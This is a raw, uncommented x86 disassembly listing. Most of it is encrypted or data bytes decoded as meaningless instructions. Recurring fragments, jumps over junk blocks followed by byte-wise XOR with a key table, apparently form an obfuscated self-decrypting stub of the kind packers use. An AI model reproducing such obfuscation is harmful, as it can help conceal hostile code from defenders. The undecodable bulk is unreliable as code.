  409252:	xor    eax,esi
  409254:	jmp    0x40932c
  409259:	xchg   esp,eax
  40925a:	sub    BYTE PTR [edi-0xa004026],0xce
  409261:	test   dh,ch
  409263:	xchg   esi,eax
  409264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409265:	cmc    
  409266:	adc    dl,ah
  409268:	lahf   
  409269:	arpl   WORD PTR [eax+0x0],bx
  40926c:	add    BYTE PTR [ebx+0x37000000],bh
  409272:	pop    edx
  409273:	fcomp  QWORD PTR [esi+0x6258043c]
  409279:	pop    edi
  40927a:	fwait
  40927b:	pop    ecx
  40927c:	or     al,0x32
  40927e:	mov    dh,0xc1
  409280:	es dec esi
  409282:	xchg   BYTE PTR [edx+ebp*2-0xf48cd13],bl
  409289:	cmp    bl,BYTE PTR [ecx]
  40928b:	jge    0x409233
  40928d:	add    edi,ebp
  40928f:	lahf   
  409290:	cmp    ecx,eax
  409292:	add    al,0xc5
  409294:	(bad)  
  409295:	pop    edx
  409296:	xor    ah,ch
  409298:	mov    edx,ss
  40929a:	push   ds
  40929b:	adc    BYTE PTR [ebx+0x46],bl
  40929e:	jae    0x4092fa
  4092a0:	jae    0x4092a3
  4092a2:	scas   eax,DWORD PTR es:[edi]
  4092a3:	push   esi
  4092a4:	imul   esp,DWORD PTR [edx-0xe1424d3],0x47
  4092ab:	add    al,0x27
  4092ad:	fadd   DWORD PTR ss:[edi+edx*1+0x49]
  4092b2:	adc    BYTE PTR [ebx+0x3a0f64d4],dh
  4092b8:	retf   0xfa42
  4092bb:	test   eax,0x22c43588
  4092c0:	imul   esi,DWORD PTR [esi-0x346c36ab],0x75
  4092c7:	inc    edi
  4092c8:	mov    cl,0x47
  4092ca:	int    0x6d
  4092cc:	retf   
  4092cd:	fdiv   st,st(6)
  4092cf:	jae    0x4092bb
  4092d1:	or     BYTE PTR ds:0xb735f1df,al
  4092d7:	jmp    0x40925f
  4092d9:	xchg   ebp,eax
  4092da:	stos   DWORD PTR es:[edi],eax
  4092db:	mov    esp,0xa5efb6cc
  4092e0:	push   es
  4092e1:	mov    bl,0x9
  4092e3:	enter  0xf2a2,0xe4
  4092e7:	add    edx,DWORD PTR ss:[esi]
  4092ea:	sub    eax,0x1d0342e
  4092ef:	arpl   bx,dx
  4092f1:	(bad)  
  4092f2:	scas   al,BYTE PTR es:[edi]
  4092f3:	push   ecx
  4092f4:	xchg   edi,eax
  4092f5:	xor    bh,bl
  4092f7:	jnp    0x4092db
  4092f9:	mov    edx,0x2d64ac86
  4092fe:	rcl    BYTE PTR [edx-0x122d26af],0xe9
  409305:	xlat   BYTE PTR ds:[ebx]
  409306:	inc    edx
  409307:	adc    al,0x8b
  409309:	mov    al,0x96
  40930b:	mov    eax,ds:0x4108ba53
  409310:	shl    eax,cl
  409312:	sbb    bh,BYTE PTR [ecx+0x74]
  409315:	jmp    0x5eed5d28
  40931a:	int    0x4
  40931c:	dec    ebp
  40931d:	dec    ebx
  40931e:	add    DWORD PTR [edi+0x76bf7255],ebp
  409324:	mov    cl,0x1d
  409326:	je     0x40930c
  409328:	xor    al,0x6c
  40932b:	lea    eax,es:[eax+edx*1-0x66479db3]
  409333:	mov    DWORD PTR [ebp+0x10],eax
  409336:	mov    eax,DWORD PTR [ebp+0x18]
  409339:	mov    edx,DWORD PTR [ebp+0x1c]
  40933c:	xor    eax,esi
  40933e:	mov    dl,BYTE PTR [ebp+eax*1-0x66479db7]
  409345:	mov    eax,DWORD PTR [ebp+0x10]
  409348:	xor    BYTE PTR [eax],dl
  40934a:	mov    eax,DWORD PTR [ebp-0x38]
  40934d:	mov    edx,DWORD PTR [ebp-0x34]
  409350:	mov    edx,DWORD PTR ds:0x42f1d4
  409356:	jmp    0x40942e
  40935b:	inc    ebp
  40935c:	or     al,0x7c
  40935e:	inc    ebx
  40935f:	jge    0x4093d4
  409361:	jg     0x409371
  409363:	arpl   cx,si
  409365:	push   esi
  409366:	or     eax,0x9fdc8db8
  40936b:	push   ds
  40936c:	pop    ecx
  40936d:	add    BYTE PTR [eax],al
  40936f:	mov    ebx,0xc1000000
  409374:	xchg   ecx,eax
  409375:	fcomp  st(6)
  409377:	imul   esp,DWORD PTR [eax+esi*2],0x607890e8
  40937e:	neg    esp
  409380:	aaa    
  409381:	mov    esp,0xa654790c
  409386:	(bad)  
  409387:	rcr    BYTE PTR [ecx+ebp*8],1
  40938a:	sub    cl,BYTE PTR [eax-0x6c348b19]
  409390:	cmp    edi,edx
  409392:	mov    edi,0x21913426
  409397:	xor    DWORD PTR [ecx],0xffffff95
  40939a:	aad    0x97
  40939c:	push   cs
  40939d:	stos   BYTE PTR es:[edi],al
  40939e:	jge    0x4093e5
  4093a0:	xchg   edx,eax
  4093a1:	add    BYTE PTR [eax+0x2595ae5c],al
  4093a7:	mov    ebp,0xe4ebb0e2
  4093ac:	inc    edi
  4093ad:	adc    eax,0x15b42e7f
  4093b2:	sbb    eax,edi
  4093b4:	jnp    0x40935f
  4093b6:	mov    eax,ds:0xb7b1f78c
  4093bb:	ins    BYTE PTR es:[edi],dx
  4093bc:	out    dx,al
  4093bd:	call   0xac36:0x5bf2ee7d
  4093c4:	popa   
  4093c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093c6:	lahf   
  4093c7:	retf   
  4093c8:	xor    eax,0xe8ab2948
  4093cd:	mov    ecx,0xfaba12f3
  4093d2:	inc    ebx
  4093d3:	fidivr WORD PTR [esi-0x34]
  4093d6:	iret   
  4093d7:	jnp    0x409366
  4093d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093da:	ins    DWORD PTR es:[edi],dx
  4093db:	mov    ebx,0xa4581251
  4093e0:	test   BYTE PTR [ebx+0x7d213a08],0xa4
  4093e7:	fwait
  4093e8:	cwde   
  4093e9:	inc    ebx
  4093ea:	stc    
  4093eb:	les    edi,FWORD PTR [ecx]
  4093ed:	add    DWORD PTR [eax-0x13141d5f],ebx
  4093f3:	imul   eax,ecx,0x719816a4
  4093f9:	inc    ebx
  4093fa:	push   es
  4093fb:	addr16 mov ds:0x4436,al
  4093ff:	mov    edi,0xf1537aed
  409404:	sbb    ah,0x32
  409407:	mov    bh,0x7d
  409409:	add    DWORD PTR [edx+0x7e86ba85],esi
  40940f:	jmp    0xd87cf419
  409414:	jb     0x40948e
  409416:	adc    ebx,DWORD PTR [esi]
  409418:	les    edx,FWORD PTR [ecx]
  40941a:	pop    ebp
  40941b:	lods   eax,DWORD PTR ds:[esi]
  40941c:	push   ds
  40941d:	ja     0x409419
  40941f:	pop    eax
  409420:	adc    dl,dl
  409422:	push   esi
  409423:	or     eax,0x1ce2292a
  409428:	inc    edx
  409429:	aaa    
  40942a:	jge    0x4093b6
  40942c:	xchg   DWORD PTR [ebx+esi*1+0x10848dc6],ebp
  409433:	dec    ebp
  409434:	bound  edi,QWORD PTR [eax+0x10458999]
  40943a:	mov    eax,DWORD PTR [ebp-0x38]
  40943d:	mov    edx,DWORD PTR [ebp-0x34]
  409440:	xor    eax,esi
  409442:	mov    dl,BYTE PTR [ebp+eax*1-0x66479db7]
  409449:	mov    eax,DWORD PTR [ebp+0x10]
  40944c:	xor    BYTE PTR [eax],dl
  40944e:	mov    eax,DWORD PTR [ebp-0x28]
  409451:	jmp    0x409529
  409456:	ins    BYTE PTR es:[edi],dx
  409457:	shl    BYTE PTR [esi-0xd],0xee
  40945b:	idiv   ebp
  40945d:	fisttp WORD PTR [edx-0x33]
  409460:	inc    esi
  409461:	(bad)  
  409463:	icebp  
  409464:	(bad)  
  409465:	lahf   
  409466:	fstp   DWORD PTR [ecx+0x0]
  409469:	add    BYTE PTR [ebx-0x50000000],bh
  40946f:	jbe    0x4093f2
  409471:	leave  
  409472:	jecxz  0x40942f
  409474:	stc    
  409475:	add    al,0x99
  409477:	mov    ah,0x2a
  409479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40947a:	in     eax,dx
  40947b:	cwde   
  40947c:	mov    dh,BYTE PTR [eax]
  40947e:	add    eax,0x8e2af7c5
  409483:	push   eax
  409484:	mov    ecx,?
  409486:	(bad)  
  409487:	repnz cdq 
  409489:	aad    0xe8
  40948b:	repnz dec esp
  40948d:	cli    
  40948e:	mov    ah,dl
  409490:	add    esi,DWORD PTR [eax]
  409492:	xchg   edx,eax
  409493:	loopne 0x4094a0
  409495:	lea    esp,[esi-0x54d44029]
  40949b:	test   eax,0x4faa6de1
  4094a0:	cwde   
  4094a1:	mov    bh,0x4a
  4094a3:	das    
  4094a4:	and    BYTE PTR [edx+ebx*1-0xbe5b3d7],dh
  4094ab:	adc    ah,al
  4094ad:	inc    edx
  4094ae:	mov    ah,0x8e
  4094b0:	pop    ds
  4094b1:	out    dx,eax
  4094b2:	arpl   WORD PTR ss:[ebx+0x41f02134],bx
  4094b9:	push   eax
  4094ba:	outs   dx,DWORD PTR ds:[esi]
  4094bb:	and    ch,BYTE PTR [eax-0x1a]
  4094be:	mov    ah,0xaf
  4094c0:	push   ebp
  4094c1:	ret    
  4094c2:	sahf   
  4094c3:	popf   
  4094c4:	loop   0x40947d
  4094c6:	push   edx
  4094c7:	and    DWORD PTR [edi],eax
  4094c9:	cs popa 
  4094cb:	xchg   BYTE PTR [eax],dl
  4094cd:	push   edi
  4094ce:	in     eax,dx
  4094cf:	cli    
  4094d0:	jle    0x40946f
  4094d2:	sbb    DWORD PTR [esi],0x9a6246ec
  4094d8:	in     eax,dx
  4094d9:	pop    es
  4094da:	push   edi
  4094db:	out    dx,al
  4094dc:	add    BYTE PTR [ebx+eax*1+0x6],dl
  4094e0:	mov    ecx,?
  4094e2:	stos   DWORD PTR es:[edi],eax
  4094e3:	mov    bl,0x40
  4094e5:	test   eax,0xfd5d39ba
  4094ea:	xor    al,0x99
  4094ec:	push   esp
  4094ed:	pop    esp
  4094ee:	ret    0xb28e
  4094f1:	sahf   
  4094f2:	sub    bh,BYTE PTR [ebx+0x5f]
  4094f5:	fs test bl,0x5b
  4094f9:	mov    edx,0x3077b13d
  4094fe:	bound  esp,QWORD PTR [ebx]
  409500:	in     eax,dx
  409501:	data16 sbb dh,BYTE PTR [ebx+0x33]
  409505:	mov    al,ds:0x7549e50b
  40950a:	repz dec BYTE PTR [ebx]
  40950d:	adc    bl,ah
  40950f:	sub    eax,0x678d5262
  409514:	out    0xa8,al
  409516:	(bad)  
  409517:	das    
  409518:	pop    ds
  409519:	xor    ah,BYTE PTR [edx+0x414e0711]
  40951f:	fbld   TBYTE PTR [ebx+0xc041ecc]
  409525:	lea    edx,[ebp-0xc]
  409528:	adc    eax,0xe9dc558b
  40952d:	rol    DWORD PTR [eax],cl
  40952f:	add    BYTE PTR [eax],al
  409531:	jp     0x409595
  409533:	test   BYTE PTR [ecx-0xc806202],0x3d
  40953a:	lahf   
  40953b:	sbb    al,0x70
  40953d:	ror    BYTE PTR [eax+0x5a947418],1
  409543:	add    BYTE PTR [eax],al
  409545:	mov    ebx,0x5000000
  40954a:	fcomp  QWORD PTR [esp+eax*8+0x5ffffd2d]
  409551:	pmaxub mm0,QWORD PTR [esi-0x6db83804]
  409558:	sub    al,0x1
  40955a:	pop    es
  40955b:	imul   ebp,DWORD PTR [esi-0x3b0ed312],0x217acf11
  409565:	add    ecx,esi
  409567:	aad    0x3e
  409569:	dec    esi
  40956a:	mov    ah,0x99
  40956c:	sbb    DWORD PTR [edx-0x57],0xffffffd9
  409570:	and    al,0x94
  409572:	inc    esp
  409573:	push   ss
  409574:	frstor [eax-0x40]
  409577:	push   edx
  409578:	inc    edi
  409579:	push   esp
  40957a:	mov    bl,0xf0
  40957c:	neg    DWORD PTR [esi*2+0x54b38fd]
  409583:	jle    0x409590
  409585:	aam    0x85
  409587:	enter  0x166c,0x82
  40958b:	mov    esi,0x6ff6519f
  409590:	arpl   WORD PTR [edi+0x1a],ax
  409593:	retf   
  409594:	les    edx,FWORD PTR [ebx]
  409596:	add    dl,dh
  409598:	push   esi
  409599:	inc    edi
  40959a:	rcr    DWORD PTR [ebx],0x6f
  40959d:	add    al,0x32
  40959f:	xchg   ecx,eax
  4095a0:	or     edi,DWORD PTR [ebx+0xb]
  4095a3:	lahf   
  4095a4:	scas   al,BYTE PTR es:[edi]
  4095a5:	ss jge 0x409610
  4095a8:	pop    eax
  4095a9:	fist   WORD PTR [ebx]
  4095ab:	aaa    
  4095ac:	mov    bh,0x86
  4095ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095af:	les    ebx,FWORD PTR ds:0xc19b6eda
  4095b5:	repnz mov edi,0xc840b33f
  4095bb:	div    BYTE PTR [edi+0x5e]
  4095be:	dec    ebx
  4095bf:	rcl    BYTE PTR [ebx-0x7d4bf9a1],1
  4095c5:	mov    eax,0x852f2eb9
  4095ca:	mov    ebx,0xfd52baa8
  4095cf:	jo     0x409642
  4095d1:	inc    eax
  4095d2:	xor    BYTE PTR [ebx],dl
  4095d4:	popa   
  4095d5:	mov    eax,ecx
  4095d7:	in     al,0x7
  4095d9:	mov    cl,0x25
  4095db:	sti    
  4095dc:	aam    0x87
  4095de:	push   ss
  4095df:	inc    edx
  4095e0:	retf   
  4095e1:	retf   0x3922
  4095e4:	enter  0x3896,0x6b
  4095e8:	repnz sub edx,DWORD PTR [edi]
  4095eb:	imul   eax,DWORD PTR [ebp+0x428a5ce8],0x6d
  4095f2:	aaa    
  4095f3:	mov    edi,0x38a2830f
  4095f8:	push   cs
  4095f9:	inc    eax
  4095fa:	sub    bh,BYTE PTR [edi+eax*1]
  4095fd:	jb     0x4095dd
  4095ff:	addr16 mov dh,0xd1
  409602:	xchg   edi,eax
  409604:	mov    edx,DWORD PTR ds:0x42f1d4
  40960a:	xor    eax,esi
  40960c:	lea    eax,[eax+edx*1-0x66479db3]
  409613:	jmp    0x4096eb
  409618:	and    eax,0xe7adc602
  40961d:	in     eax,dx
  40961e:	outs   dx,DWORD PTR ds:[esi]
  40961f:	mov    bl,BYTE PTR [esi+0x1e3fa2e5]
  409625:	cmc    
  409626:	sub    ebx,DWORD PTR [edi+ecx*2]
  409629:	pop    ebx
  40962a:	add    BYTE PTR [eax],al
  40962c:	mov    ebx,0xcc000000
  409631:	dec    edx
  409632:	jnp    0x40960c
  409634:	(bad)  
  409636:	repnz mov al,ds:0x5a1d83c8
  40963c:	or     DWORD PTR [ecx],ecx
  40963e:	clc    
  40963f:	inc    ebp
  409640:	jge    0x409656
  409642:	cmp    edx,DWORD PTR [ecx]
  409644:	jle    0x40964c
  409646:	ja     0x40961f
  409648:	dec    ebp
  409649:	xlat   BYTE PTR ds:[ebx]
  40964a:	and    cl,BYTE PTR ds:[esi]
  40964d:	pop    ecx
  40964e:	mov    ds:0x385d7694,al
  409653:	mov    cl,BYTE PTR [esi+ecx*2-0x5d473f51]
  40965a:	dec    edx
  40965b:	mov    bh,0x5a
  40965d:	leave  
  40965e:	inc    ecx
  40965f:	loop   0x40966d
  409661:	xor    BYTE PTR [ebp+0x64],ah
  409664:	pop    es
  409665:	jno    0x409632
  409667:	retf   0x11c6
  40966a:	sti    
  40966b:	dec    esi
  40966c:	(bad)
  409670:	or     eax,0xb8cb63e5
  409675:	aam    0x4d
  409677:	leave  
  409678:	jle    0x4096d9
  40967a:	loope  0x4096b5
  40967c:	ss (bad) 
  40967e:	mov    esp,0xdd0c88b8
  409683:	mov    eax,0xe5d29f6
  409688:	mov    edi,0x3d3512f
  40968d:	arpl   WORD PTR [eax+0x78],bx
  409690:	dec    ecx
  409691:	mov    bl,0x2b
  409693:	stos   BYTE PTR es:[edi],al
  409694:	pop    es
  409695:	or     ebx,DWORD PTR [ecx-0x16]
  409698:	(bad)
  40969b:	sbb    eax,0x50fff85d
  4096a0:	int3   
  4096a1:	cmp    ah,bh
  4096a3:	retf   
  4096a4:	addr16 xor eax,0x5a1ace93
  4096aa:	pop    edx
  4096ab:	or     ch,BYTE PTR [esi+0x6c]
  4096ae:	outs   dx,DWORD PTR ds:[esi]
  4096af:	adc    bp,di
  4096b2:	fistp  DWORD PTR [esi-0x9e80cfd]
  4096b8:	xchg   ebp,eax
  4096b9:	jge    0x4096f3
  4096bb:	imul   esi,esp,0xffffffee
  4096be:	sub    dh,cl
  4096c0:	xchg   ecx,eax
  4096c1:	xchg   BYTE PTR [eax+0x68],al
  4096c4:	repz mov edi,0xc894d339
  4096ca:	neg    edi
  4096cc:	mov    ebx,0x28295dfb
  4096d1:	jecxz  0x40970a
  4096d3:	out    dx,eax
  4096d4:	or     eax,0x63926cdf
  4096d9:	xchg   ebx,eax
  4096da:	neg    DWORD PTR [ecx-0x3a66a021]
  4096e0:	adc    eax,0x2db32da6
  4096e5:	inc    esp
  4096e6:	das    
  4096e7:	inc    edi
  4096e8:	mov    dl,0x7a
  4096ea:	adc    al,0x89
  4096ec:	inc    ebp
  4096ed:	adc    BYTE PTR [ebx-0x2c1627bb],cl
  4096f3:	add    BYTE PTR [eax],al
  4096f5:	add    BYTE PTR [ebp-0x64],al
  4096f8:	mov    dl,0x33
  4096fa:	sti    
  4096fb:	aas    
  4096fc:	(bad)  
  4096ff:	mov    dl,0xa2
  409701:	aas    
  409702:	sti    
  409703:	pop    ecx
  409704:	inc    edi
  409705:	je     0x409711
  409707:	pop    esp
  409708:	add    BYTE PTR [eax],al
  40970a:	mov    ebx,0xac000000
  40970f:	push   0xfc0b84e2
  409714:	xor    ah,bh
  409716:	repz xchg esi,eax
  409718:	pop    ebx
  409719:	push   ecx
  40971a:	popaw  
  40971c:	daa    
  40971d:	in     eax,dx
  40971e:	cmp    DWORD PTR [esi],esi
  409720:	sub    BYTE PTR [esp+ecx*2-0x752e05a7],dl
  409727:	and    al,0xb5
  409729:	jno    0x409780
  40972b:	mov    al,ds:0x91aaa362
  409730:	pop    ebp
  409731:	xchg   DWORD PTR ds:0x4548e72f,ecx
  409737:	pop    eax
  409738:	test   cl,bl
  40973a:	out    0xbf,al
  40973c:	test   BYTE PTR [edx+0x7075ec9b],0x6
  409743:	stc    
  409744:	mov    ds:0x3104fb00,eax
  409749:	sti    
  40974a:	test   DWORD PTR [esi],0x904a645f
  409750:	adc    edx,esp
  409752:	loop   0x40976f
  409754:	popf   
  409755:	cmp    eax,0x84dd4d13
  40975a:	aas    
  40975b:	sub    bl,ch
  40975d:	adc    eax,0xbfc84ae6
  409762:	jbe    0x4097b3
  409764:	cli    
  409765:	jl     0x409784
  409767:	and    DWORD PTR [ebp+0x16c9cd9a],0xffffffd0
  40976e:	mov    ebx,0xf9e5f4f1
  409773:	push   edi
  409774:	and    BYTE PTR es:[eax],dh
  409777:	or     bh,BYTE PTR [edi+0x4356addf]
  40977d:	test   DWORD PTR [ecx+0xdf432fa],ecx
  409783:	sub    ebp,DWORD PTR [eax-0x5b]
  409786:	mov    eax,ds:0x82dd5b8f
  40978b:	sahf   
  40978c:	adc    BYTE PTR [edi-0x3004e264],al
  409792:	in     al,dx
  409793:	mov    dh,ch
  409795:	xor    al,0x4b
  409797:	loop   0x40980a
  409799:	pop    edx
  40979a:	jmp    0x894e:0x6d7d659c
  4097a1:	in     eax,dx
  4097a2:	lods   eax,DWORD PTR ds:[esi]
  4097a3:	dec    esp
  4097a4:	and    al,BYTE PTR [ebp+0x77]
  4097a7:	lahf   
  4097a8:	call   0x7b6e:0x2f608e4f
  4097af:	int    0xb4
  4097b1:	or     ah,BYTE PTR [edi+0x7a]
  4097b4:	jg     0x409826
  4097b6:	push   ecx
  4097b7:	pop    ebp
  4097b8:	jne    0x4097b8
  4097ba:	dec    DWORD PTR ds:0x98b21a57
  4097c0:	mov    WORD PTR [edi+0x3e],ds
  4097c3:	lock pop edi
  4097c5:	call   0xdc55:0x8b0ba9d3
  4097cc:	xor    eax,esi
  4097ce:	jmp    0x4098a6
  4097d3:	mov    dl,0xe7
  4097d5:	jno    0x4097cb
  4097d7:	jne    0x4097cf
  4097d9:	mov    bh,0xe7
  4097db:	dec    edx
  4097dc:	fst    QWORD PTR [edi+eiz*2+0x59b3f556]
  4097e3:	lds    ebx,FWORD PTR [eax+eax*1+0x0]
  4097e7:	mov    ebx,0x92000000
  4097ec:	fild   QWORD PTR [ebx-0x77f45f89]
  4097f2:	jl     0x409860
  4097f4:	test   eax,0x7236acba
  4097f9:	xor    BYTE PTR [esi-0x73],dh
  4097fc:	pop    ebp
  4097fd:	push   edi
  4097fe:	addr16 int3 
  409800:	mov    dh,0xa1
  409802:	jle    0x4097fc
  409804:	cs jnp 0x409835
  409807:	out    0x69,eax
  409809:	in     eax,dx
  40980a:	stos   DWORD PTR es:[edi],eax
  40980b:	es loopne 0x409850
  40980e:	test   al,0x42
  409810:	mov    eax,0x3f40dc00
  409815:	cmp    eax,DWORD PTR [edi]
  409817:	push   ebx
  409818:	je     0x409834
  40981a:	jmp    0xa6cf:0xfdec99fd
  409821:	mov    BYTE PTR [ebx-0x6d2e4fe7],bl
  409827:	ja     0x40983c
  409829:	int3   
  40982a:	push   esi
  40982b:	pop    ss
  40982c:	cmp    BYTE PTR [esi-0x28],0x99
  409830:	stc    
  409831:	xlat   BYTE PTR ds:[ebx]
  409832:	sar    edx,0xb
  409835:	inc    esi
  409836:	shl    BYTE PTR [eax-0x5e970d7e],cl
  40983c:	push   esi
  40983d:	cmp    ebx,DWORD PTR [edx-0x15890333]
  409843:	cs pop ebx
  409845:	in     eax,dx
  409846:	ds mov ah,0x6f
  409849:	xchg   edi,eax
  40984a:	pop    esp
  40984b:	lock jb 0x40986e
  40984e:	inc    ebx
  40984f:	and    eax,0xe46972cb
  409854:	sti    
  409855:	and    edi,DWORD PTR [edi+0x9]
  409858:	mov    dh,0x28
  40985a:	(bad)  [esi+0xf953f23]
  409860:	test   BYTE PTR [esi],al
  409862:	(bad)  
  409863:	sti    
  409864:	cmp    bh,dl
  409866:	xchg   edx,eax
  409867:	push   edi
  409868:	out    dx,al
  409869:	jno    0x4098a6
  40986b:	inc    esp
  40986c:	add    ecx,DWORD PTR [ecx]
  40986e:	lock dec esi
  409870:	out    0xcd,eax
  409872:	inc    ebx
  409873:	sub    DWORD PTR [edx],ecx
  409875:	or     BYTE PTR [edi],0x33
  409878:	fwait
  409879:	add    eax,0xb0b36cc4
  40987e:	test   bh,dl
  409880:	pop    edx
  409881:	repz imul ecx,DWORD PTR ds:0x347d12c4,0x91568e14
  40988c:	in     eax,0x2c
  40988e:	mov    edi,0x9dca5c8d
  409893:	daa    
  409894:	fistp  DWORD PTR [edx+0x5e4e662]
  40989a:	outs   dx,BYTE PTR ds:[esi]
  40989b:	(bad)  
  40989c:	sub    eax,0x978cfb48
  4098a1:	sub    eax,0x11660ee8
  4098a6:	mov    dl,BYTE PTR [ebp+eax*1-0x66479db7]
  4098ad:	jmp    0x409985
  4098b2:	sti    
  4098b3:	stc    
  4098b4:	pop    edx
  4098b5:	ins    BYTE PTR es:[edi],dx
  4098b6:	pop    edx
  4098b7:	out    dx,eax
  4098b8:	(bad)  
  4098b9:	jmp    DWORD PTR [ebp+0x43]
  4098bc:	pop    esp
  4098bd:	ret    
  4098be:	mov    ds:0x809f289d,al
  4098c3:	pop    ebp
  4098c4:	add    BYTE PTR [eax],al
  4098c6:	mov    ebx,0xa0000000
  4098cb:	retf   0xa71e
  4098ce:	mov    esp,0x13a564a0
  4098d3:	add    DWORD PTR [esi+0x39],esi
  4098d6:	fcomp  QWORD PTR [eax+edx*4+0x193734b8]
  4098dd:	or     BYTE PTR [ecx],bl
  4098df:	cmp    BYTE PTR [esi],al
  4098e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e2:	jno    0x409874
  4098e4:	and    bl,0xf0
  4098e7:	xchg   edi,eax
  4098e8:	loopne 0x40992c
  4098ea:	pop    es
  4098eb:	imul   edx,DWORD PTR ss:[eax+edi*2],0xffffffd0
  4098f0:	add    ah,BYTE PTR [edi-0x1cdf897b]
  4098f6:	gs mov ah,0xc3
  4098f9:	or     DWORD PTR [edx],edx
  4098fb:	int    0xdf
  4098fd:	aas    
  4098fe:	loope  0x409929
  409900:	(bad)  
  409901:	std    
  409902:	push   esp
  409903:	mov    ebx,fs
  409905:	dec    esi
  409906:	dec    ebx
  409907:	xor    eax,0x20e04584
  40990c:	adc    DWORD PTR ds:0x1aac9d51,ecx
  409912:	push   0x6c
  409914:	push   ss
  409915:	dec    ebp
  409916:	icebp  
  409917:	mov    eax,ds:0x6d8b3538
  40991c:	push   ss
  40991d:	xchg   BYTE PTR [ebx+eiz*8],bl
  409920:	sub    al,BYTE PTR [esi-0x41]
  409923:	add    edi,ecx
  409925:	(bad)  
  409926:	out    0x38,eax
  409928:	and    al,0x26
  40992a:	aam    0x18
  40992c:	pop    ebp
  40992d:	dec    edi
  40992e:	in     al,dx
  40992f:	jle    0x409952
  409931:	arpl   WORD PTR [esp+0x3e9a5894],bx
  409938:	sbb    BYTE PTR [edx+eiz*4+0x1e],al
  40993c:	or     DWORD PTR [edi-0x1e7b019e],esp
  409942:	out    0xc,eax
  409944:	cmp    eax,0xfe3cb79d
  409949:	sar    BYTE PTR [eax],0x70
  40994c:	inc    ebx
  40994d:	adc    al,0x33
  40994f:	fs (bad) 
  409951:	call   0x61301c3f
  409956:	aaa    
  409957:	repnz xor eax,0x9aaf5ec1
  40995d:	and    al,0xb4
  40995f:	push   0x45
  409961:	adc    BYTE PTR [ebx+0x5076260c],ch
  409967:	sti    
  409968:	dec    esp
  409969:	sbb    edx,DWORD PTR [ebp+0x4b]
  40996c:	clc    
  40996d:	popa   
  40996e:	fldcw  WORD PTR [ebx+edx*4]
  409971:	dec    esp
  409972:	mul    ch
  409974:	dec    ebp
  409975:	xchg   BYTE PTR [edi-0x66],bh
  409978:	inc    ecx
  409979:	fs push ebp
  40997b:	mulps  xmm4,xmm7
  40997e:	push   0x5d
  409980:	test   DWORD PTR [edx+0x69],esp
  409983:	mov    bh,0x6b
  409985:	mov    eax,DWORD PTR [ebp+0x10]
  409988:	xor    BYTE PTR [eax],dl
  40998a:	mov    eax,DWORD PTR [edi]
  40998c:	jmp    0x409a64
  409991:	jg     0x4099ca
  409993:	dec    edi
  409994:	mov    eax,ds:0xfffff94f
  409999:	enter  0xa4c4,0x65
  40999d:	mov    ds:0x3b5f0e5a,al
  4099a2:	pop    esi
  4099a3:	add    BYTE PTR [eax],al
  4099a5:	mov    ebx,0xd6000000
  4099aa:	add    ah,bl
  4099ac:	cwde   
  4099ad:	test   BYTE PTR [esi+0x3f],bh
  4099b0:	sbb    edi,DWORD PTR [eax+0x501850c]
  4099b6:	mov    ds:0x890be866,eax
  4099bb:	ss mov esp,0x89728682
  4099c2:	pop    edx
  4099c3:	sub    ch,cl
  4099c5:	or     eax,0xd36e8149
  4099ca:	aad    0xb4
  4099cc:	push   ecx
  4099cd:	mov    bl,0xde
  4099cf:	ss jnp 0x4099c1
  4099d2:	sub    BYTE PTR [ecx+0x4b],al
  4099d5:	jg     0x4099ce
  4099d7:	out    0x15,al
  4099d9:	xor    DWORD PTR [esi+0x5d8d0c14],ecx
  4099df:	aaa    
  4099e0:	and    DWORD PTR [esi],edx
  4099e2:	call   0xc4f5:0x71b8eea2
  4099e9:	xor    ebp,ebx
  4099eb:	xor    ebx,esi
  4099ed:	shr    dl,1
  4099ef:	(bad)  
  4099f0:	and    ch,BYTE PTR [ecx+ecx*8-0x78c3c665]
  4099f7:	cmp    eax,ebx
  4099f9:	xor    cl,cl
  4099fb:	jecxz  0x409a52
  4099fd:	sub    eax,0x5ff7ec5
  409a02:	add    DWORD PTR [edx-0x40],ebx
  409a05:	out    0xf8,eax
  409a07:	hlt    
  409a08:	cmp    BYTE PTR [ebx-0x4a47c218],0x86
  409a0f:	inc    ebp
  409a10:	jns    0x4099fa
  409a12:	xor    eax,0xb9a9ce72
  409a17:	jl     0x4099e7
  409a19:	das    
  409a1a:	cmc    
  409a1b:	and    ch,BYTE PTR [ebx]
  409a1d:	fld    QWORD PTR [ebx]
  409a1f:	aad    0x4c
  409a21:	aad    0xe8
  409a23:	ret    
  409a24:	push   esp
  409a25:	sahf   
  409a26:	or     eax,0x66cfdc63
  409a2b:	or     DWORD PTR [ebx],ecx
  409a2d:	mov    eax,ds:0x3f317470
  409a32:	pushf  
  409a33:	fwait
  409a34:	shr    esi,0x90
  409a37:	outs   dx,DWORD PTR ds:[esi]
  409a38:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  409a3a:	jmp    0x21ce:0x87188d39
  409a41:	call   0x1fb0:0xb5e45d2c
  409a48:	jbe    0x409a1e
  409a4a:	jnp    0x409ab8
  409a4c:	pause  
  409a4e:	push   ss
  409a4f:	and    al,0xda
  409a51:	push   ecx
  409a52:	pop    esi
  409a53:	pop    ss
  409a54:	sar    BYTE PTR [edi+0x26893f3d],0x5a
  409a5b:	in     eax,0xce
  409a5d:	push   ebp
  409a5e:	mov    al,0x47
  409a60:	call   0x457:0x8bee74cd
  409a67:	jmp    0x409b3f
  409a6c:	or     eax,0xbf9f9cb2
  409a71:	mov    edi,0x880bb20f
  409a76:	adc    al,0x3f
  409a78:	into   
  409a79:	pop    ecx
  409a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a7b:	cmp    esi,esi
  409a7d:	pop    esi
  409a7e:	add    BYTE PTR [eax],al
  409a80:	mov    ebx,0x2d000000
  409a85:	out    0xe2,eax
  409a87:	loop   0x409ab5
  409a89:	imul   eax,DWORD PTR [ebp+0x52883793],0x29152673
  409a93:	xchg   esp,eax
  409a94:	add    ch,0x44
  409a97:	push   ebp
  409a98:	mov    bh,0x80
  409a9a:	fwait
  409a9b:	xchg   BYTE PTR [ebx+edi*1],ch
  409a9e:	sub    al,0xf6
  409aa0:	mov    eax,ds:0x608d423f
  409aa5:	(bad)  
